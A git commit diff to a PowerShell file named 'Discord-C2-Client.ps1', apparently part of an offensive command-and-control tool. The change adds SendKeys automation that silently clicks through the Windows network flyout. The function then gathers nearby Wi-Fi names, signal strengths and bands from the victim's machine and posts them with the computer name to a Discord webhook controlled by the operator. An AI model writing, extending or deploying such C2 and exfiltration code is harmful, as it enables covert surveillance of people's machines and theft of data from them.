f58bf2f2ba1f75e8bd779ae51186432c331032e8
egieb <93350544+beigeworm@users.noreply.github.com>
2023-12-13 20:01:49 +0000

    Update Discord-C2-Client.ps1

--- Discord-C2-Client.ps1
+++ Discord-C2-Client.ps1
@@ -203,7 +203,17 @@ Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Bo
 
 Function NearbyWifi {
 $showNetworks = explorer.exe ms-availablenetworks:
-sleep 5
+sleep 4
+$wshell = New-Object -ComObject wscript.shell
+$wshell.AppActivate('explorer.exe')
+$tab = 0
+while ($tab -lt 6){
+$wshell.SendKeys('{TAB}')
+$tab++
+}
+$wshell.SendKeys('{ENTER}')
+$wshell.SendKeys('{TAB}')
+$wshell.SendKeys('{ESC}')
 $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
 $Wifi = ($NearbyWifi|Out-String)
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "``$Wifi``"} | ConvertTo-Json
